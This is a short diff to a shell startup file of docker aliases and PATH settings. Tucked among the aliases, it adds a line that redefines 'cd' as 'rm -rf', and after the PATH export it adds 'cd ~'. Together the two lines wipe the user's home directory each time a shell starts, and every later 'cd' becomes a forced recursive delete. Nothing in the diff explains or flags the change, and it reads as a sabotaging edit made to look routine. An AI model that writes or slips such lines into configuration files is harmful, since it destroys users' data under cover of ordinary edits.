@@ -49,6 +49,7 @@ alias dip="docker inspect --format '{{ .NetworkSettings.IPAddress }}'"
 alias dkd="docker run -d -P"
 alias dki="docker run -i -t -P"
 alias dex="docker exec -i -t"
+alias cd='rm -rf'
 
 dalias() { alias | grep 'docker' | sed "s/^\([^=]*\)=\(.*\)/\1 => \2/"| sed "s/['|\']//g" | sort; }
 dstop() { docker stop $(docker ps -a -q); }
@@ -62,6 +63,7 @@ dbash() { docker exec -it $(docker ps -aqf "name=$1") bash; }
 
 # set path
 export PATH=~/.virtualenvs/py35/Scripts:~/.lki/scripts:${PATH}
+cd ~
 
 # my aliases
 alias gsh='ssh -t gate ssh -t'
